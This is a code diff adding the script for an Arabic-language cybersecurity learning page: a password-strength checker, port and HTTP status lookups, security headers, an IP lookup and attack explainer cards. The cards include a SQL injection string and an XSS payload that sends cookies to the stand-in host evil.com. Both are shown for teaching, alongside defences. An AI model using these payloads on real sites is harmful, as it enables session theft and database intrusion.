+    len: pass.length >= 8,
+    upper: /[A-Z]/.test(pass),
+    lower: /[a-z]/.test(pass),
+    num: /[0-9]/.test(pass),
+    sym: /[^A-Za-z0-9]/.test(pass),
+    long: pass.length >= 16,
+  };
+
+  Object.keys(checks).forEach(k => {
+    const el = document.getElementById('chk-' + k);
+    if(el) el.classList.toggle('ok', checks[k]);
+  });
+
+  const score = Object.values(checks).filter(Boolean).length;
+  const fill = document.getElementById('strengthFill');
+  const label = document.getElementById('strengthLabel');
+  const pct = Math.min(100, (score / 6) * 100);
+
+  const levels = [
+    {min:0, color:'#ff3c5a', text:'❌ ضعيفة جداً'},
+    {min:2, color:'#ff8c00', text:'⚠️ ضعيفة'},
+    {min:3, color:'#ffd700', text:'🔶 متوسطة'},
+    {min:4, color:'#00ff88', text:'✅ جيدة'},
+    {min:5, color:'#00d4ff', text:'💪 قوية جداً'},
+    {min:6, color:'#00d4ff', text:'🔐 ممتازة'},
+  ];
+  const level = levels.filter(l => score >= l.min).pop();
+  fill.style.width = pct + '%';
+  fill.style.background = level.color;
+  label.textContent = pass ? level.text : '—';
+  label.style.color = level.color;
+
+  // Crack time estimate
+  const charset = (checks.lower?26:0)+(checks.upper?26:0)+(checks.num?10:0)+(checks.sym?32:0)||1;
+  const combinations = Math.pow(charset, pass.length || 1);
+  const guessPerSec = 1e10;
+  const seconds = combinations / guessPerSec;
+  const crackEl = document.getElementById('crackTime');
+  if(!pass) { crackEl.innerHTML = 'اكتب كلمة مرور أولاً...'; return; }
+  let timeStr;
+  if(seconds < 1) timeStr = '⚡ أقل من ثانية — خطير جداً!';
+  else if(seconds < 60) timeStr = `⚡ ${seconds.toFixed(1)} ثانية`;
+  else if(seconds < 3600) timeStr = `⚠️ ${(seconds/60).toFixed(1)} دقيقة`;
+  else if(seconds < 86400) timeStr = `🔶 ${(seconds/3600).toFixed(1)} ساعة`;
+  else if(seconds < 31536000) timeStr = `🔶 ${(seconds/86400).toFixed(0)} يوم`;
+  else if(seconds < 3153600000) timeStr = `✅ ${(seconds/31536000).toFixed(0)} سنة`;
+  else timeStr = `✅✅ ${(seconds/3153600000).toFixed(0)} قرن أو أكثر — آمنة جداً!`;
+  crackEl.innerHTML = `
+    <div>الطول: <strong style="color:var(--cyan)">${pass.length} حرف</strong></div>
+    <div>حجم الأبجدية: <strong style="color:var(--cyan)">${charset} رمز</strong></div>
+    <div>الاحتمالات: <strong style="color:var(--cyan)">${combinations.toExponential(2)}</strong></div>
+    <div style="margin-top:8px;font-size:.9rem">وقت الاختراق: <strong style="color:${level.color}">${timeStr}</strong></div>
+    <div style="font-size:.68rem;color:var(--txt3);margin-top:4px">* باستخدام 10 مليار محاولة في الثانية</div>
+  `;
+}
+
+// ═══════════════════════════════════════
+//  PORTS
+// ═══════════════════════════════════════
+const PORTS = [
+  {port:20,proto:'FTP-Data',desc:'نقل بيانات FTP'},
+  {port:21,proto:'FTP',desc:'التحكم في نقل الملفات'},
+  {port:22,proto:'SSH',desc:'الاتصال الآمن بالسيرفر'},
+  {port:23,proto:'Telnet',desc:'اتصال غير آمن (قديم)'},
+  {port:25,proto:'SMTP',desc:'إرسال البريد الإلكتروني'},
+  {port:53,proto:'DNS',desc:'ترجمة أسماء النطاقات'},
+  {port:67,proto:'DHCP',desc:'توزيع عناوين IP تلقائياً'},
+  {port:80,proto:'HTTP',desc:'مواقع الويب العادية'},
+  {port:110,proto:'POP3',desc:'استقبال البريد الإلكتروني'},
+  {port:143,proto:'IMAP',desc:'إدارة البريد على السيرفر'},
+  {port:443,proto:'HTTPS',desc:'مواقع الويب المشفرة (SSL/TLS)'},
+  {port:445,proto:'SMB',desc:'مشاركة الملفات في Windows'},
+  {port:3306,proto:'MySQL',desc:'قاعدة بيانات MySQL'},
+  {port:3389,proto:'RDP',desc:'سطح المكتب البعيد (Windows)'},
+  {port:5432,proto:'PostgreSQL',desc:'قاعدة بيانات PostgreSQL'},
+  {port:6379,proto:'Redis',desc:'قاعدة بيانات Redis'},
+  {port:8080,proto:'HTTP-Alt',desc:'خادم ويب بديل'},
+  {port:8443,proto:'HTTPS-Alt',desc:'HTTPS بديل'},
+  {port:27017,proto:'MongoDB',desc:'قاعدة بيانات MongoDB'},
+];
+
+function initPorts() {
+  const grid = document.getElementById('portsGrid');
+  grid.innerHTML = PORTS.map(p => `
+    <div class="port-item">
+      <div class="port-num">${p.port}</div>
+      <div class="port-proto">${p.proto}</div>
+      <div class="port-desc">${p.desc}</div>
+    </div>
+  `).join('');
+}
+
+function lookupPort() {
+  const q = parseInt(document.getElementById('portQuery').value);
+  const res = document.getElementById('portResult');
+  res.style.display = 'block';
+  const found = PORTS.find(p => p.port === q);
+  if(found) {
+    res.textContent = `Port ${found.port}\nBروتوكول: ${found.proto}\nالاستخدام: ${found.desc}`;
+  } else if(q > 0 && q <= 65535) {
+    res.textContent = `Port ${q}: غير معروف في القائمة الشائعة\nالنطاق: ${q < 1024 ? 'Well-Known Ports (0-1023)' : q < 49152 ? 'Registered Ports (1024-49151)' : 'Dynamic Ports (49152-65535)'}`;
+  } else {
+    res.textContent = '❌ أدخل رقم بين 1 و 65535';
+  }
+}
+
+// ═══════════════════════════════════════
+//  HTTP STATUS CODES
+// ═══════════════════════════════════════
+const STATUS_CODES = [
+  {code:200,name:'OK',desc:'الطلب نجح',cls:'s2xx'},
+  {code:201,name:'Created',desc:'تم إنشاء مورد جديد',cls:'s2xx'},
+  {code:204,name:'No Content',desc:'نجح بدون محتوى للإرجاع',cls:'s2xx'},
+  {code:301,name:'Moved Permanently',desc:'الصفحة انتقلت بشكل دائم',cls:'s3xx'},
+  {code:302,name:'Found',desc:'إعادة توجيه مؤقتة',cls:'s3xx'},
+  {code:304,name:'Not Modified',desc:'المحتوى لم يتغير — استخدم الـ Cache',cls:'s3xx'},
+  {code:400,name:'Bad Request',desc:'الطلب خاطئ في الصياغة',cls:'s4xx'},
+  {code:401,name:'Unauthorized',desc:'يحتاج مصادقة (تسجيل دخول)',cls:'s4xx'},
+  {code:403,name:'Forbidden',desc:'ممنوع — ليس لديك صلاحية',cls:'s4xx'},
+  {code:404,name:'Not Found',desc:'الصفحة غير موجودة',cls:'s4xx'},
+  {code:405,name:'Method Not Allowed',desc:'الـ HTTP Method غير مسموح',cls:'s4xx'},
+  {code:429,name:'Too Many Requests',desc:'تجاوزت الحد المسموح من الطلبات',cls:'s4xx'},
+  {code:500,name:'Internal Server Error',desc:'خطأ داخلي في السيرفر',cls:'s5xx'},
+  {code:502,name:'Bad Gateway',desc:'السيرفر الوسيط تلقى رداً خاطئاً',cls:'s5xx'},
+  {code:503,name:'Service Unavailable',desc:'السيرفر غير متاح مؤقتاً',cls:'s5xx'},
+];
+
+function initHTTP() {
+  const list = document.getElementById('statusList');
+  list.innerHTML = STATUS_CODES.map(s => `
+    <div class="status-item">
+      <div class="status-code ${s.cls}">${s.code}</div>
+      <div><div class="status-name">${s.name}</div><div class="status-desc">${s.desc}</div></div>
+    </div>
+  `).join('');
+
+  document.getElementById('secHeaders').innerHTML = [
+    {name:'Content-Security-Policy', desc:'يمنع XSS بتحديد مصادر المحتوى المسموحة', ex:"Content-Security-Policy: default-src 'self'"},
+    {name:'X-Frame-Options', desc:'يمنع تضمين الموقع في iframe (Clickjacking)', ex:'X-Frame-Options: DENY'},
+    {name:'X-Content-Type-Options', desc:'يمنع MIME sniffing', ex:'X-Content-Type-Options: nosniff'},
+    {name:'Strict-Transport-Security', desc:'يجبر استخدام HTTPS فقط (HSTS)', ex:'Strict-Transport-Security: max-age=31536000; includeSubDomains'},
+    {name:'Referrer-Policy', desc:'يتحكم في معلومات الـ Referrer المرسلة', ex:'Referrer-Policy: no-referrer'},
+    {name:'Permissions-Policy', desc:'يحدد صلاحيات المتصفح (كاميرا، ميكروفون...)', ex:"Permissions-Policy: camera=(), microphone=()"},
+  ].map(h => `
+    <div class="header-item">
+      <div class="header-name">${h.name}</div>
+      <div class="header-desc">${h.desc}</div>
+      <div class="header-example">${h.ex}</div>
+    </div>
+  `).join('');
+}
+
+function lookupStatus() {
+  const q = parseInt(document.getElementById('statusQuery').value);
+  const res = document.getElementById('statusResult');
+  res.style.display = 'block';
+  const found = STATUS_CODES.find(s => s.code === q);
+  if(found) res.textContent = `${found.code} ${found.name}\n${found.desc}`;
+  else res.textContent = `الكود ${q} غير موجود في قائمتنا`;
+}
+
+// ═══════════════════════════════════════
+//  IP INFO
+// ═══════════════════════════════════════
+async function getMyIP() {
+  const btn = document.getElementById('ipBtn');
+  const res = document.getElementById('ipResult');
+  btn.textContent = '⏳ جاري الجلب...';
+  btn.disabled = true;
+  res.style.display = 'block';
+  res.textContent = '⏳ جاري جلب المعلومات...';
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const d = await r.json();
+    res.textContent = [
+      `IP العام: ${d.ip}`,
+      `الدولة: ${d.country_name} ${d.country_name==='Egypt'?'🇪🇬':d.country_name==='Saudi Arabia'?'🇸🇦':'🌍'}`,
+      `المدينة: ${d.city || 'غير محدد'}`,
+      `مزود الإنترنت: ${d.org || 'غير محدد'}`,
+      `نوع IP: IPv${d.version || '4'}`,
+      `المنطقة الزمنية: ${d.timezone || 'غير محدد'}`,
+    ].join('\n');
+  } catch(e) {
+    res.textContent = '⚠️ تعذر جلب المعلومات\n(قد يكون VPN يمنع الطلب أو لا يوجد إنترنت)';
+  }
+  btn.textContent = '🔍 اعرف IP جهازك';
+  btn.disabled = false;
+}
+
+// ═══════════════════════════════════════
+//  NETWORK CONCEPTS
+// ═══════════════════════════════════════
+function initNetwork() {
+  const concepts = [
+    {title:'TCP/IP — أساس الإنترنت', desc:'بروتوكول يضمن وصول البيانات بالترتيب الصحيح. TCP = موثوق وبطيء نسبياً. UDP = سريع غير موثوق.'},
+    {title:'OSI Model — 7 طبقات الشبكة', desc:'نموذج تصوري يقسم الاتصال لـ 7 طبقات: Physical → Data Link → Network → Transport → Session → Presentation → Application'},
+    {title:'DNS — نظام أسماء النطاقات', desc:'يحول الأسماء (google.com) لعناوين IP. هجوم DNS Poisoning يغير هذه التحويلات لإعادة التوجيه لمواقع مزيفة.'},
+    {title:'Firewall — جدار الحماية', desc:'يراقب ويفلتر حركة المرور الشبكية بناءً على قواعد محددة. يمنع الاتصالات الضارة.'},
+    {title:'VPN — الشبكة الخاصة الافتراضية', desc:'يشفر الاتصال ويخفي الـ IP الحقيقي. يُستخدم للخصوصية والوصول لمحتوى مقيد.'},
+    {title:'SSL/TLS — بروتوكول التشفير', desc:'يشفر البيانات المنقولة بين المتصفح والسيرفر. الموقع الذي يبدأ بـ HTTPS يستخدمه.'},
+    {title:'Subnetting — تقسيم الشبكات', desc:'تقسيم شبكة كبيرة لشبكات أصغر. مثال: 192.168.1.0/24 تعني 256 عنوان IP.'},
+    {title:'ARP — بروتوكول تحليل العناوين', desc:'يحول عناوين IP لعناوين MAC. هجوم ARP Poisoning يعترض الاتصالات المحلية.'},
+  ];
+  document.getElementById('networkConcepts').innerHTML = concepts.map(c => `
+    <div class="net-concept">
+      <div class="net-title">${c.title}</div>
+      <div class="net-desc">${c.desc}</div>
+    </div>
+  `).join('');
+}
+
+// ═══════════════════════════════════════
+//  ATTACKS
+// ═══════════════════════════════════════
+function initAttacks() {
+  const attacks = [
+    {icon:'💉',name:'SQL Injection',severity:'عالي',color:'var(--red)',
+     desc:'حقن أوامر SQL في نماذج الإدخال للوصول لقاعدة البيانات أو تدميرها.',
+     example:"مثال: إدخال ' OR '1'='1 في خانة كلمة المرور",
+     protect:'استخدام Prepared Statements وتحقق من المدخلات'},
+    {icon:'🔗',name:'XSS — Cross-Site Scripting',severity:'عالي',color:'var(--red)',
+     desc:'حقن كود JavaScript ضار في صفحات ويب يُشاهدها مستخدمون آخرون.',
+     example:'مثال: <script>document.location="evil.com?c="+document.cookie</script>',
+     protect:'تشفير المخرجات واستخدام Content-Security-Policy'},
+    {icon:'🌊',name:'DDoS Attack',severity:'عالي',color:'var(--red)',
+     desc:'إغراق السيرفر بملايين الطلبات لتعطيله عن المستخدمين الحقيقيين.',
+     example:'مثال: شبكة Botnet من 100,000 جهاز مخترق تهاجم موقع واحد',
+     protect:'CDN مثل Cloudflare، Rate Limiting، DDoS Protection'},
+    {icon:'🎣',name:'Phishing',severity:'متوسط',color:'var(--orange)',
+     desc:'إنشاء صفحات وهمية تشبه مواقع حقيقية لسرقة بيانات الدخول.',
+     example:'مثال: إيميل من "pay-pal-security.com" يطلب تأكيد حسابك',
+     protect:'التحقق من الرابط، 2FA، عدم النقر على روابط مجهولة'},
+    {icon:'👤',name:'Man in the Middle (MitM)',severity:'عالي',color:'var(--red)',
+     desc:'المهاجم يجلس بين المستخدم والسيرفر ويراقب/يعدل البيانات.',
+     example:'مثال: على WiFi مفتوح، المهاجم يقرأ كل ما ترسله',
+     protect:'استخدام HTTPS فقط، VPN على الشبكات العامة، HSTS'},
+    {icon:'🔒',name:'Brute Force',severity:'متوسط',color:'var(--orange)',
+     desc:'تجريب ملايين كلمات المرور تلقائياً حتى إيجاد الصحيحة.',
+     example:'مثال: تجربة كل الأرقام المكونة من 6 خانات = 1,000,000 محاولة',
+     protect:'كلمات مرور قوية، 2FA، Account Lockout, Rate Limiting'},
+    {icon:'💰',name:'Ransomware',severity:'عالي جداً',color:'var(--red)',
+     desc:'برنامج يشفر ملفاتك ويطلب فدية لفكها.',
+     example:'مثال: WannaCry 2017 أصاب 230,000 جهاز في 150 دولة',
+     protect:'نسخ احتياطية منتظمة، تحديث النظام، عدم فتح مرفقات مجهولة'},
+    {icon:'🐛',name:'Zero-Day Exploit',severity:'عالي جداً',color:'var(--red)',
+     desc:'استغلال ثغرة غير معروفة بعد لدى صانع البرنامج.',
+     example:'مثال: ثغرة في Windows لم يكتشفها Microsoft بعد',
+     protect:'تحديث البرامج فوراً، برامج الحماية، Network Monitoring'},
+  ];
+
+  document.getElementById('attacksList').innerHTML = attacks.map(a => `
+    <div class="card" style="border-color:${a.color}22">
+      <div class="card-title">${a.icon} ${a.name} <span style="font-size:.65rem;background:${a.color}22;color:${a.color};border:1px solid ${a.color}44;padding:2px 8px;border-radius:10px;font-weight:700">${a.severity}</span></div>
+      <p style="font-size:.78rem;color:var(--txt2);margin-bottom:8px">${a.desc}</p>
+      <div style="background:var(--bg3);border-radius:6px;padding:8px 12px;font-size:.72rem;color:var(--txt3);font-family:'JetBrains Mono',monospace;margin-bottom:8px">${a.example}</div>
+      <div style="font-size:.72rem;color:var(--green)">🛡️ الحماية: ${a.protect}</div>
+    </div>
+  `).join('');
+}
+
+// ═══════════════════════════════════════
+//  INIT
+// ═══════════════════════════════════════
+initPorts();
+initHTTP();
+initNetwork();
+initAttacks();
+</script>
+</body>
+</html>
